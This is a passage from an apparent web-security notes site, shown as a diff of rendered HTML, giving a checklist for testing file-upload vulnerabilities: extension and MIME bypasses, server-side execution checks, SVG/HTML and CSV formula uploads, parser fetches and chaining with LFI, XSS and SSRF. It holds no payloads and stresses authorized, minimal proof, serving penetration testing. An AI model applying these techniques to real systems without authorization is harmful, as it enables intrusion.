+<h2 id="testing-checklist">Testing Checklist</h2>
+<h3 id="discovery">Discovery</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified every upload feature.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Captured baseline upload request and response.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Uploaded harmless marker file first.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Found whether file is directly accessible.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified storage path or public URL.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether upload is synchronous or asynchronous.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether uploaded files are renamed.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether duplicate filenames overwrite.</li>
+</ul>
+<h3 id="validation-mapping">Validation Mapping</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested allowed extensions.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested blocked extensions.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested extension case sensitivity.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested double extensions.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested trailing dot/space.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested MIME header manipulation.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested magic-byte checks.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested corrupt image behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested oversized file behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested duplicate multipart fields.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested UTF-8 filename parsing.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested traversal in filename.</li>
+</ul>
+<h3 id="server-side-execution">Server-Side Execution</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified backend stack where possible.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested PHP-relevant extensions if PHP stack.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested ASPX/ASHX-relevant extensions if IIS stack.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested JSP/WAR-relevant extensions if Java stack.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether uploaded file is downloaded or executed.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether configuration files can alter execution behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Confirmed execution only with minimal proof and only when explicitly authorized.</li>
+</ul>
+<h3 id="client-side-impact">Client-Side Impact</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested HTML upload.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested SVG upload.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested CSV formula behavior.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether files are served inline.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether uploaded content is rendered in admin panel.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether metadata appears in pages or exports.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked trusted-origin impact.</li>
+</ul>
+<h3 id="parser-processing">Parser / Processing</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked thumbnail generation.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked image metadata preservation.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked PDF/document conversion.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked ZIP extraction.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked media processing.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked OAST callback behavior for parser fetches.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether parser errors leak internal paths.</li>
+</ul>
+<h3 id="chaining">Chaining</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + LFI.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + path traversal.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + object storage key control.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + stored XSS.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + admin panel rendering.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + race condition.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + overwrite/collision.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested upload + SSRF through URL import.</li>
+</ul>
+<h3 id="evidence">Evidence</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Saved original request.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Saved accepted upload request.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Saved response showing filename/path/URL.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Saved request proving file access.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Saved screenshot or raw response proving impact.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used minimal marker or low-impact proof.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided broad exploitation unless the scope explicitly allowed it.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../File_Inclusion/" class="md-footer__link md-footer__link--prev" aria-label="Previous: File Inclusion">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                File Inclusion
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../IDOR/" class="md-footer__link md-footer__link--next" aria-label="Next: IDOR (Insecure Direct Object Reference)">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                IDOR (Insecure Direct Object Reference)
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
